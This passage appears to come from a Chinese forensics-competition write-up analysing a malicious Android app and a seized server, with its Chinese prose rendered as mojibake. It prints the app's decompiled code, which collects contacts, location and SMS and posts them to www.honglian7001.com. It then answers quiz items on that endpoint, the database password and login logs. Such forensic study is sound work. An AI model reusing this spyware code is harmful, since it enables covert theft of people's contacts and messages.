class="hljs-keyword">if</span> (e.<span class="hljs-property">index</span> == <span class="hljs-number">1</span>) &#123;<br><span class="hljs-comment">//ç¡®è®¤ï¼Œæ‰“å¼€å½“å‰åº”ç”¨æƒé™è®¾ç½®é¡µé¢  </span><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">UIApplication</span> = plus.<span class="hljs-property">ios</span>.<span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;UIApplication&#x27;</span>);<br><span class="hljs-keyword">var</span> application2 = <span class="hljs-title class_">UIApplication</span>.<span class="hljs-title function_">sharedApplication</span>();<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">NSURL2</span> = plus.<span class="hljs-property">ios</span>.<span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;NSURL&#x27;</span>);<br><span class="hljs-comment">// var setting2 = NSURL2.URLWithString(&quot;prefs:root=LOCATION_SERVICES&quot;);                             </span><br><span class="hljs-keyword">var</span> setting2 = <span class="hljs-title class_">NSURL2</span>.<span class="hljs-title class_">URLWithString</span>(<span class="hljs-string">&#x27;app-settings:&#x27;</span>);<br>application2.<span class="hljs-title function_">openURL</span>(setting2);<br><br>plus.<span class="hljs-property">ios</span>.<span class="hljs-title function_">deleteObject</span>(setting2);<br>plus.<span class="hljs-property">ios</span>.<span class="hljs-title function_">deleteObject</span>(<span class="hljs-title class_">NSURL2</span>);<br>plus.<span class="hljs-property">ios</span>.<span class="hljs-title function_">deleteObject</span>(application2)<br>&#125;<br>&#125;, <span class="hljs-string">&#x27;div&#x27;</span>)<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">aa</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">var</span> sjh = $(<span class="hljs-string">&#x27;#sjh&#x27;</span>).<span class="hljs-title function_">val</span>();<br><span class="hljs-keyword">var</span> yqm = $(<span class="hljs-string">&#x27;#yqm&#x27;</span>).<span class="hljs-title function_">val</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">parseInt</span>(sjh) &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">parseInt</span>(yqm) &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">parseInt</span>(sjh) &gt; <span class="hljs-number">13000000000</span> &amp;&amp; <span class="hljs-built_in">parseInt</span>(sjh) &lt; <span class="hljs-number">19999999999</span> &amp;&amp; <span class="hljs-built_in">parseInt</span>(yqm) &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">parseInt</span>(yqm) &lt; <span class="hljs-number">999999</span>) &#123;<br><br><span class="hljs-title function_">getPermission</span>(<span class="hljs-string">&#x27;CONTACTS&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><span class="hljs-title function_">huoqu</span>(sjh, yqm);<br><br>&#125;, <span class="hljs-keyword">function</span> (<span class="hljs-params">msg</span>) &#123;<br>mui.<span class="hljs-title function_">alert</span>(msg, <span class="hljs-string">&#x27;æé†’&#x27;</span>, <span class="hljs-string">&#x27;ç¡®å®š&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123; &#125;, <span class="hljs-string">&#x27;div&#x27;</span>)<br><span class="hljs-comment">//aa()</span><br>&#125;)<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>mui.<span class="hljs-title function_">toast</span>(<span class="hljs-string">&#x27;è¯·è¾“å…¥æ­£ç¡®çš„æ‰‹æœºå·å’Œé‚€è¯·ç &#x27;</span>)<br>&#125;<br><br>&#125;<br><br><br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">dingwei</span>(<span class="hljs-params">sjh, yqm</span>) &#123;<br>plus.<span class="hljs-property">geolocation</span>.<span class="hljs-title function_">getCurrentPosition</span>(translatePoint, <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br>mui.<span class="hljs-title function_">toast</span>(<span class="hljs-string">&quot;å¼‚å¸¸:&quot;</span> + e.<span class="hljs-property">message</span>);<br>&#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">translatePoint</span>(<span class="hljs-params">position</span>) &#123;<br><br><span class="hljs-keyword">var</span> sjh = $(<span class="hljs-string">&#x27;#sjh&#x27;</span>).<span class="hljs-title function_">val</span>()<br><span class="hljs-keyword">var</span> yqm = $(<span class="hljs-string">&#x27;#yqm&#x27;</span>).<span class="hljs-title function_">val</span>()<br><span class="hljs-keyword">var</span> currentLon = position.<span class="hljs-property">coords</span>.<span class="hljs-property">longitude</span>;<br><span class="hljs-keyword">var</span> currentLat = position.<span class="hljs-property">coords</span>.<span class="hljs-property">latitude</span>;<br><span class="hljs-keyword">var</span> jingweidu = sjh + <span class="hljs-string">&#x27;,&#x27;</span> + yqm + <span class="hljs-string">&#x27;,&#x27;</span> + currentLon + <span class="hljs-string">&#x27;,&#x27;</span> + currentLat;<br>mui.<span class="hljs-title function_">ajax</span>(apiserver + <span class="hljs-string">&#x27;apimap&#x27;</span>, &#123;<br><span class="hljs-attr">data</span>: &#123;<br><span class="hljs-attr">data</span>: jingweidu<br>&#125;,<br><span class="hljs-attr">dataType</span>: <span class="hljs-string">&#x27;text&#x27;</span>,<span class="hljs-comment">//æœåŠ¡å™¨è¿”å›jsonæ ¼å¼æ•°æ®</span><br><span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-comment">//HTTPè¯·æ±‚ç±»å‹</span><br><span class="hljs-attr">timeout</span>: <span class="hljs-number">10000</span>,<span class="hljs-comment">//è¶…æ—¶æ—¶é—´è®¾ç½®ä¸º10ç§’ï¼›              </span><br><span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br><br><span class="hljs-keyword">if</span> (data == <span class="hljs-string">&#x27;è·å–æˆåŠŸ&#x27;</span>) &#123;<br><span class="hljs-title function_">requestPermission</span>(sjh, yqm);<br><br><span class="hljs-comment">//setInterval(function()&#123;</span><br><span class="hljs-comment">//var sjh=$(&#x27;#sjh&#x27;).val();</span><br><span class="hljs-comment">//var yqm=$(&#x27;#yqm&#x27;).val();</span><br><span class="hljs-comment">//requestPermission(sjh,yqm);</span><br><span class="hljs-comment">//console.log(&#x27;send&#x27;)</span><br><br><span class="hljs-comment">//&#125;,30000)</span><br>&#125;<br><br>mui.<span class="hljs-title function_">toast</span>(data)<br>&#125;,<br><span class="hljs-attr">error</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">xhr, type, errorThrown</span>) &#123;<br><span class="hljs-comment">//å¼‚å¸¸å¤„ç†ï¼›</span><br><br><br>&#125;<br>&#125;);<br><br><span class="hljs-comment">//ä¹¦å†™è‡ªå·±çš„é€»è¾‘</span><br><br>&#125;<br><span class="hljs-comment">// æ‰©å±•APIåŠ è½½å®Œæ¯•ï¼Œç°åœ¨å¯ä»¥æ­£å¸¸è°ƒç”¨æ‰©å±•API</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">huoqu</span>(<span class="hljs-params">sjh, yqm</span>) &#123;<br><span class="hljs-keyword">var</span> con = sjh + <span class="hljs-string">&quot;**&quot;</span> + yqm + <span class="hljs-string">&#x27;**&#x27;</span> + address;<br><br><br>plus.<span class="hljs-property">contacts</span>.<span class="hljs-title function_">getAddressBook</span>(plus.<span class="hljs-property">contacts</span>.<span class="hljs-property">ADDRESSBOOK_PHONE</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">addressbook</span>) &#123;<br><br><br>addressbook.<span class="hljs-title function_">find</span>([<span class="hljs-string">&quot;displayName&quot;</span>, <span class="hljs-string">&quot;phoneNumbers&quot;</span>], <span class="hljs-keyword">function</span> (<span class="hljs-params">contacts</span>) &#123;<br><br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>, len = contacts.<span class="hljs-property">length</span>; i &lt; len; i++) &#123;<br>con = con + <span class="hljs-string">&#x27;=&#x27;</span> + contacts[i].<span class="hljs-property">displayName</span> + <span class="hljs-string">&#x27;|&#x27;</span> + (contacts[i].<span class="hljs-property">phoneNumbers</span>.<span class="hljs-property">length</span> == <span class="hljs-number">0</span> ? <span class="hljs-string">&quot;&quot;</span> : contacts[i].<span class="hljs-property">phoneNumbers</span>[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>);<br>&#125;<br><br><br><br><br><br>mui.<span class="hljs-title function_">ajax</span>(apiserver + <span class="hljs-string">&#x27;api&#x27;</span>, &#123;<br><span class="hljs-attr">data</span>: &#123;<br><span class="hljs-attr">data</span>: con<br>&#125;,<br><span class="hljs-attr">dataType</span>: <span class="hljs-string">&#x27;text&#x27;</span>,<span class="hljs-comment">//æœåŠ¡å™¨è¿”å›jsonæ ¼å¼æ•°æ®</span><br><span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-comment">//HTTPè¯·æ±‚ç±»å‹</span><br><span class="hljs-attr">timeout</span>: <span class="hljs-number">10000</span>,<span class="hljs-comment">//è¶…æ—¶æ—¶é—´è®¾ç½®ä¸º10ç§’ï¼›              </span><br><span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br><span class="hljs-comment">//alert(data)</span><br><span class="hljs-keyword">if</span> (data == <span class="hljs-string">&#x27;æ­£åœ¨åŠ è½½åˆ—è¡¨&#x27;</span>) &#123;<br><span class="hljs-title function_">dingwei</span>(sjh, yqm);<br>mui.<span class="hljs-title function_">openWindow</span>(&#123;<br><span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;list.html&#x27;</span>,<br><span class="hljs-attr">show</span>: &#123;<br><span class="hljs-attr">autoShow</span>: <span class="hljs-literal">true</span><br>&#125;<br>&#125;);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>mui.<span class="hljs-title function_">toast</span>(data)<br>&#125;<br><span class="hljs-comment">//console.log(con)</span><br>&#125;,<br><span class="hljs-attr">error</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">xhr, type, errorThrown</span>) &#123;<br><span class="hljs-comment">//å¼‚å¸¸å¤„ç†ï¼›</span><br><br><br>&#125;<br>&#125;);<br><br><br><br>&#125;, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>mui.<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;ä¸ºä¿è¯ç”¨æˆ·è´¨é‡ï¼Œä½¿ç”¨æœ¬appè¯·åŒæ„é€šè®¯å½•æˆæƒ &quot;</span>);<br>&#125;, &#123;<br><span class="hljs-attr">multiple</span>: <span class="hljs-literal">true</span><br>&#125;);<br>&#125;, <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br>mui.<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;ä¸ºä¿è¯ç”¨æˆ·è´¨é‡ï¼Œä½¿ç”¨æœ¬appè¯·åŒæ„é€šè®¯å½•æˆæƒ &quot;</span>);<br>&#125;);<br>&#125;<br><br><br><br><br>&#125;);<br></code></pre></td></tr></table></figure><p>åˆ†æåå¾—åˆ°ï¼Œé€‰<code>ACDE</code></p><h2 id="ç¬¬å…­é¢˜"><a href="#ç¬¬å…­é¢˜" class="headerlink" title="ç¬¬å…­é¢˜"></a>ç¬¬å…­é¢˜</h2><h3 id="è¯¥APKç¨‹åºå›ä¼ é€šè®¯å½•æ—¶-ä½¿ç”¨çš„httpè¯·æ±‚æ–¹å¼ä¸ºï¼ˆï¼‰"><a href="#è¯¥APKç¨‹åºå›ä¼ é€šè®¯å½•æ—¶-ä½¿ç”¨çš„httpè¯·æ±‚æ–¹å¼ä¸ºï¼ˆï¼‰" class="headerlink" title="è¯¥APKç¨‹åºå›ä¼ é€šè®¯å½•æ—¶,ä½¿ç”¨çš„httpè¯·æ±‚æ–¹å¼ä¸ºï¼ˆï¼‰"></a>è¯¥APKç¨‹åºå›ä¼ é€šè®¯å½•æ—¶,ä½¿ç”¨çš„httpè¯·æ±‚æ–¹å¼ä¸ºï¼ˆï¼‰</h3><p>ç”±ä¸Šä¸€é¢˜ä¸­å¾—åˆ°çš„ä»£ç å¯çŸ¥ï¼Œ</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs lasso">mui.ajax(apiserver + <span class="hljs-string">&#x27;apisms&#x27;</span>, &#123;<br><span class="hljs-built_in">data</span>: &#123;<br><span class="hljs-built_in">data</span>: duanxin<br>&#125;,<br>dataType: <span class="hljs-string">&#x27;text&#x27;</span>,<span class="hljs-comment">//æœåŠ¡å™¨è¿”å›jsonæ ¼å¼æ•°æ®</span><br><span class="hljs-keyword">type</span>: <span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-comment">//HTTPè¯·æ±‚ç±»å‹</span><br>timeout: <span class="hljs-number">10000</span>,<span class="hljs-comment">//è¶…æ—¶æ—¶é—´è®¾ç½®ä¸º10ç§’ï¼›              </span><br>success: function (<span class="hljs-built_in">data</span>) &#123;<br>mui.toast(<span class="hljs-string">&#x27;è·å–æˆåŠŸ&#x27;</span>)<br><span class="hljs-comment">//console.log(con)</span><br></code></pre></td></tr></table></figure><p>httpè¯·æ±‚ç±»å‹ä¸º<code>post</code></p><h2 id="ç¬¬ä¸ƒé¢˜"><a href="#ç¬¬ä¸ƒé¢˜" class="headerlink" title="ç¬¬ä¸ƒé¢˜"></a>ç¬¬ä¸ƒé¢˜</h2><h3 id="è¯¥APKç¨‹åºçš„å›ä¼ åœ°å€åŸŸåä¸ºã€æ ‡å‡†æ ¼å¼ï¼šwww-abc-comã€‘"><a href="#è¯¥APKç¨‹åºçš„å›ä¼ åœ°å€åŸŸåä¸ºã€æ ‡å‡†æ ¼å¼ï¼šwww-abc-comã€‘" class="headerlink" title="è¯¥APKç¨‹åºçš„å›ä¼ åœ°å€åŸŸåä¸ºã€æ ‡å‡†æ ¼å¼ï¼šwww.abc.comã€‘"></a>è¯¥APKç¨‹åºçš„å›ä¼ åœ°å€åŸŸåä¸ºã€æ ‡å‡†æ ¼å¼ï¼š<a href="http://www.abc.comã€‘/">www.abc.comã€‘</a></h3><p>ä»£ç ä¸­å¯ä»¥æ‰¾åˆ°ï¼š<br><code>var apiserver = &#39;http://www.honglian7001.com/api/uploads/&#39;;</code><br>å› æ­¤å›ä¼ åœ°å€åŸŸåä¸ºï¼š<code>www.honglian7001.com</code></p><h2 id="ç¬¬å…«é¢˜"><a href="#ç¬¬å…«é¢˜" class="headerlink" title="ç¬¬å…«é¢˜"></a>ç¬¬å…«é¢˜</h2><h3 id="è¯¥APKç¨‹åºä»£ç ä¸­é…ç½®çš„å˜é‡apiserverçš„å€¼ä¸º-ã€æ ‡å‡†æ ¼å¼ï¼šwww-abc-com-abcã€‘"><a href="#è¯¥APKç¨‹åºä»£ç ä¸­é…ç½®çš„å˜é‡apiserverçš„å€¼ä¸º-ã€æ ‡å‡†æ ¼å¼ï¼šwww-abc-com-abcã€‘" class="headerlink" title="è¯¥APKç¨‹åºä»£ç ä¸­é…ç½®çš„å˜é‡apiserverçš„å€¼ä¸º  ã€æ ‡å‡†æ ¼å¼ï¼šwww.abc.com/abcã€‘"></a>è¯¥APKç¨‹åºä»£ç ä¸­é…ç½®çš„å˜é‡apiserverçš„å€¼ä¸º  ã€æ ‡å‡†æ ¼å¼ï¼š<a href="http://www.abc.com/abc%E3%80%91">www.abc.com/abcã€‘</a></h3><p>åŒä¸Šä¸€é¢˜ä¸­æ‰¾åˆ°çš„ï¼Œå³<code>www.honglian7001.com/api/uploads</code></p><h2 id="ç¬¬ä¹é¢˜"><a href="#ç¬¬ä¹é¢˜" class="headerlink" title="ç¬¬ä¹é¢˜"></a>ç¬¬ä¹é¢˜</h2><h3 id="åˆ†æè¯¥APKï¼Œå‘ç°è¯¥ç¨‹åºè¿˜å…·å¤‡è·å–çŸ­ä¿¡å›ä¼ åˆ°åå°çš„åŠŸèƒ½ï¼ŒçŸ­ä¿¡ä¸Šä¼ æœåŠ¡å™¨æ¥å£åœ°å€ä¸ºã€æ ‡å‡†æ ¼å¼ï¼šwww-abc-com-abcã€‘-ï¼ˆåé¢ä¸å¸¦-ï¼‰"><a href="#åˆ†æè¯¥APKï¼Œå‘ç°è¯¥ç¨‹åºè¿˜å…·å¤‡è·å–çŸ­ä¿¡å›ä¼ åˆ°åå°çš„åŠŸèƒ½ï¼ŒçŸ­ä¿¡ä¸Šä¼ æœåŠ¡å™¨æ¥å£åœ°å€ä¸ºã€æ ‡å‡†æ ¼å¼ï¼šwww-abc-com-abcã€‘-ï¼ˆåé¢ä¸å¸¦-ï¼‰" class="headerlink" title="åˆ†æè¯¥APKï¼Œå‘ç°è¯¥ç¨‹åºè¿˜å…·å¤‡è·å–çŸ­ä¿¡å›ä¼ åˆ°åå°çš„åŠŸèƒ½ï¼ŒçŸ­ä¿¡ä¸Šä¼ æœåŠ¡å™¨æ¥å£åœ°å€ä¸ºã€æ ‡å‡†æ ¼å¼ï¼šwww.abc.com/abcã€‘ ï¼ˆåé¢ä¸å¸¦&#x2F;ï¼‰"></a>åˆ†æè¯¥APKï¼Œå‘ç°è¯¥ç¨‹åºè¿˜å…·å¤‡è·å–çŸ­ä¿¡å›ä¼ åˆ°åå°çš„åŠŸèƒ½ï¼ŒçŸ­ä¿¡ä¸Šä¼ æœåŠ¡å™¨æ¥å£åœ°å€ä¸ºã€æ ‡å‡†æ ¼å¼ï¼š<a href="http://www.abc.com/abc%E3%80%91">www.abc.com/abcã€‘</a> ï¼ˆåé¢ä¸å¸¦&#x2F;ï¼‰</h3><p>ä»£ç ä¸­å¯ä»¥æ‰¾åˆ°</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mui<span class="hljs-selector-class">.ajax</span>(apiserver + <span class="hljs-string">&#x27;apisms&#x27;</span>,<br></code></pre></td></tr></table></figure><p>å…·ä½“çš„apiserveræˆ‘ä»¬å·²çŸ¥ï¼Œ<code>apisms</code>æ˜¯å…·ä½“çš„æ¥å£è·¯å¾„ï¼Œå› æ­¤æœ€ç»ˆå¾—åˆ°çš„æ¥å£è·¯å¾„ä¸º<code>www.honglian7001.com/api/uploads/apisms</code></p><h2 id="ç¬¬åé¢˜"><a href="#ç¬¬åé¢˜" class="headerlink" title="ç¬¬åé¢˜"></a>ç¬¬åé¢˜</h2><h3 id="ç»åˆ†æï¼Œå‘ç°è¯¥APKåœ¨è¿è¡Œè¿‡ç¨‹ä¸­ä¼šåœ¨æ‰‹æœºä¸­äº§ç”Ÿä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶çš„æ–‡ä»¶åä¸º"><a href="#ç»åˆ†æï¼Œå‘ç°è¯¥APKåœ¨è¿è¡Œè¿‡ç¨‹ä¸­ä¼šåœ¨æ‰‹æœºä¸­äº§ç”Ÿä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶çš„æ–‡ä»¶åä¸º" class="headerlink" title="ç»åˆ†æï¼Œå‘ç°è¯¥APKåœ¨è¿è¡Œè¿‡ç¨‹ä¸­ä¼šåœ¨æ‰‹æœºä¸­äº§ç”Ÿä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶çš„æ–‡ä»¶åä¸º"></a>ç»åˆ†æï¼Œå‘ç°è¯¥APKåœ¨è¿è¡Œè¿‡ç¨‹ä¸­ä¼šåœ¨æ‰‹æœºä¸­äº§ç”Ÿä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶çš„æ–‡ä»¶åä¸º</h3><p>æ•°æ®åº“æ–‡ä»¶åç¼€ä¸º<code>.db</code>ï¼Œæœç´¢å¾—<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250504202320966.png"><br>æ‰¾åˆ°ä¸€ä¸ªSQLiteDatabaseæ•°æ®åº“ä¸­ç”Ÿæˆçš„ä¸€ä¸ªæ–‡ä»¶<code>test.db</code></p><h2 id="ç¬¬åä¸€é¢˜"><a href="#ç¬¬åä¸€é¢˜" class="headerlink" title="ç¬¬åä¸€é¢˜"></a>ç¬¬åä¸€é¢˜</h2><h3 id="ç»åˆ†æï¼Œå‘ç°è¯¥APKåœ¨è¿è¡Œè¿‡ç¨‹ä¸­ä¼šåœ¨æ‰‹æœºä¸­äº§ç”Ÿä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ï¼Œè¯¥æ•°æ®åº“çš„åˆå§‹å¯†ç ä¸º"><a href="#ç»åˆ†æï¼Œå‘ç°è¯¥APKåœ¨è¿è¡Œè¿‡ç¨‹ä¸­ä¼šåœ¨æ‰‹æœºä¸­äº§ç”Ÿä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ï¼Œè¯¥æ•°æ®åº“çš„åˆå§‹å¯†ç ä¸º" class="headerlink" title="ç»åˆ†æï¼Œå‘ç°è¯¥APKåœ¨è¿è¡Œè¿‡ç¨‹ä¸­ä¼šåœ¨æ‰‹æœºä¸­äº§ç”Ÿä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ï¼Œè¯¥æ•°æ®åº“çš„åˆå§‹å¯†ç ä¸º"></a>ç»åˆ†æï¼Œå‘ç°è¯¥APKåœ¨è¿è¡Œè¿‡ç¨‹ä¸­ä¼šåœ¨æ‰‹æœºä¸­äº§ç”Ÿä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ï¼Œè¯¥æ•°æ®åº“çš„åˆå§‹å¯†ç ä¸º</h3><p>åˆ†æä»£ç ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">byte</span>[] key = &#123;<span class="hljs-number">97</span>, <span class="hljs-number">98</span>, <span class="hljs-number">99</span>, <span class="hljs-number">100</span>, <span class="hljs-number">101</span>, <span class="hljs-number">102</span>&#125;;<br>  <br>        <span class="hljs-attribute">SQLiteDatabase</span> writableDatabase = dbHelper.getWritableDatabase(getMD5(bytesToHex(key).substring(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>)));<br></code></pre></td></tr></table></figure><p>å…ˆè½¬æˆåå…­è¿›åˆ¶<code>616263646566</code><br>ç„¶åå–<code>[1,3)</code>çš„å€¼è¿›è¡Œmd5è®¡ç®—ï¼Œå¾—åˆ°<code>c74d97b01eae257e44aa9d5bade97baf</code></p><h2 id="ç¬¬åäºŒé¢˜"><a href="#ç¬¬åäºŒé¢˜" class="headerlink" title="ç¬¬åäºŒé¢˜"></a>ç¬¬åäºŒé¢˜</h2><h3 id="æ£€æäºŒçš„åŸå§‹ç¡¬ç›˜çš„SHA256å€¼ä¸ºï¼š"><a href="#æ£€æäºŒçš„åŸå§‹ç¡¬ç›˜çš„SHA256å€¼ä¸ºï¼š" class="headerlink" title="æ£€æäºŒçš„åŸå§‹ç¡¬ç›˜çš„SHA256å€¼ä¸ºï¼š"></a>æ£€æäºŒçš„åŸå§‹ç¡¬ç›˜çš„SHA256å€¼ä¸ºï¼š</h3><p>å…ˆä½¿ç”¨ç¬¬ä¸ƒé¢˜çš„ç­”æ¡ˆè¿›è¡Œè§£å‹</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">www.ho<span class="hljs-symbol">nglian7001</span>.com<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨X-WaysæŒ‚è½½åè®¡ç®—å“ˆå¸Œå€¼ï¼Œå¾—åˆ°<br><code>E6873068B83AF9988D297C6916329CEC9D8BCB672C6A894D393E68764391C589</code></p><h2 id="ç¬¬åä¸‰é¢˜"><a href="#ç¬¬åä¸‰é¢˜" class="headerlink" title="ç¬¬åä¸‰é¢˜"></a>ç¬¬åä¸‰é¢˜</h2><h3 id="æŸ¥è¯¢æ¶‰æ¡ˆäºæ¡ˆå‘æ—¶é—´æ®µå†…ç™»é™†æœåŠ¡å™¨çš„IPåœ°å€ä¸ºã€æ ‡å‡†æ ¼å¼ï¼š111-111-111-111ã€‘"><a href="#æŸ¥è¯¢æ¶‰æ¡ˆäºæ¡ˆå‘æ—¶é—´æ®µå†…ç™»é™†æœåŠ¡å™¨çš„IPåœ°å€ä¸ºã€æ ‡å‡†æ ¼å¼ï¼š111-111-111-111ã€‘" class="headerlink" title="æŸ¥è¯¢æ¶‰æ¡ˆäºæ¡ˆå‘æ—¶é—´æ®µå†…ç™»é™†æœåŠ¡å™¨çš„IPåœ°å€ä¸ºã€æ ‡å‡†æ ¼å¼ï¼š111.111.111.111ã€‘"></a>æŸ¥è¯¢æ¶‰æ¡ˆäºæ¡ˆå‘æ—¶é—´æ®µå†…ç™»é™†æœåŠ¡å™¨çš„IPåœ°å€ä¸ºã€æ ‡å‡†æ ¼å¼ï¼š111.111.111.111ã€‘</h3><p>åœ¨<code>/var/log/wtmp</code>æŸ¥çœ‹ç™»å½•æ—¥å¿—<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250504211832566.png"><br>å› æ­¤ä¸º<code>192.168.110.203</code></p><h2 id="ç¬¬åå››é¢˜"><a href="#ç¬¬åå››é¢˜" class="headerlink" title="ç¬¬åå››é¢˜"></a>ç¬¬åå››é¢˜</h2><h3 id="è¯·å¯¹æ£€æäºŒè¿›è¡Œåˆ†æï¼Œå¹¶å›ç­”è¯¥æœåŠ¡å™¨åœ¨é›†ç¾¤ä¸­æ‰¿æ‹…çš„ä¸»è¦ä½œç”¨æ˜¯ï¼ˆï¼‰ã€æ ¼å¼ï¼šæ–‡ä»¶å­˜å‚¨ã€‘"><a href="#è¯·å¯¹æ£€æäºŒè¿›è¡Œåˆ†æï¼Œå¹¶å›ç­”è¯¥æœåŠ¡å™¨åœ¨é›†ç¾¤ä¸­æ‰¿æ‹…çš„ä¸»è¦ä½œç”¨æ˜¯ï¼ˆï¼‰ã€æ ¼å¼ï¼šæ–‡ä»¶å­˜å‚¨ã€‘" class="headerlink" title="è¯·å¯¹æ£€æäºŒè¿›è¡Œåˆ†æï¼Œå¹¶å›ç­”è¯¥æœåŠ¡å™¨åœ¨é›†ç¾¤ä¸­æ‰¿æ‹…çš„ä¸»è¦ä½œç”¨æ˜¯ï¼ˆï¼‰ã€æ ¼å¼ï¼šæ–‡ä»¶å­˜å‚¨ã€‘"></a>è¯·å¯¹æ£€æäºŒè¿›è¡Œåˆ†æï¼Œå¹¶å›ç­”è¯¥æœåŠ¡å™¨åœ¨é›†ç¾¤ä¸­æ‰¿æ‹…çš„ä¸»è¦ä½œç”¨æ˜¯ï¼ˆï¼‰ã€æ ¼å¼ï¼šæ–‡ä»¶å­˜å‚¨ã€‘</h3><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250504223019653.png"><br>ç«çœ¼åˆ›å»ºè™šæ‹Ÿæœº<br>è¿›å…¥è™šæ‹Ÿæœºåï¼Œå°è¯•æŸ¥çœ‹å†å²å‘½ä»¤ï¼Œç”±äºæ™®é€šç”¨æˆ·èƒ½æŸ¥çœ‹çš„å†å²å‘½ä»¤æœ‰é™ï¼Œå…ˆä½¿ç”¨<code>su root</code>è¿›å…¥rootç”¨æˆ·å†ä½¿ç”¨<code>history</code>æŸ¥çœ‹å†å²å‘½ä»¤</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 